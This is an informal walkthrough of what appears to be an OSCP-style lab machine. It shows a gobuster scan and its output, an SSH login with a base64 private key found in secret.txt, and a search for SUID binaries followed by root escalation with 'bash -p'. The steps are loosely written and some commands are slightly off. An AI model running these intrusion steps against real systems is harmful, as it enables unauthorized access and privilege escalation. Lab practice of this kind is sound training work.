This machine have three steps
1 search on nmap 


2 dirbuster (php,txt,html)
```
sudo gobuster dir -u 192.168.1.102 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
```


```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.102
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2023/07/22 18:09:20 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.1.102/javascript/]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.1.102/]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.1.102/]
/license.txt          (Status: 200) [Size: 19915]
/readme.html          (Status: 200) [Size: 7278]
/robots.txt           (Status: 200) [Size: 36]
/robots.txt           (Status: 200) [Size: 36]
/secret.txt           (Status: 200) [Size: 3502]
/server-status        (Status: 403) [Size: 278]
/wp-admin             (Status: 301) [Size: 317] [--> http://192.168.1.102/wp-admin/]
/wp-content           (Status: 301) [Size: 319] [--> http://192.168.1.102/wp-content/]
/wp-includes          (Status: 301) [Size: 320] [--> http://192.168.1.102/wp-includes/]
/wp-settings.php      (Status: 500) [Size: 0]
/wp-links-opml.php    (Status: 200) [Size: 227]
/wp-cron.php          (Status: 200) [Size: 0]
/wp-load.php          (Status: 200) [Size: 0]
/wp-config.php        (Status: 200) [Size: 0]
/wp-mail.php          (Status: 403) [Size: 2709]
/wp-login.php         (Status: 200) [Size: 4812]
/wp-blog-header.php   (Status: 200) [Size: 0]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://192.168.1.102/wp-login.php?action=register]
/xmlrpc.php           (Status: 405) [Size: 42]

/xmlrpc.php           (Status: 405) [Size: 42]
===============================================================
2023/07/22 18:09:29 Finished
===============================================================

```



3 in the robots.txt search the secret.txt (is in base64)


and then save the key in an arcgive caled key.rsa   (the key is on )
ssh    oscp@(ip) -i key.rsa 

4 important thing is  to find "suids"

find / -perm 4000 -user root -type f -print >> suid.txt
find / -perm 4000 -user root -type f  >> suid.txt
cat suid.txt
/usr/bin/bash -p
(sometimes sudo -l sometimes you get some things really easy)
(noom and lean some scripts that tipically sometimes you did)

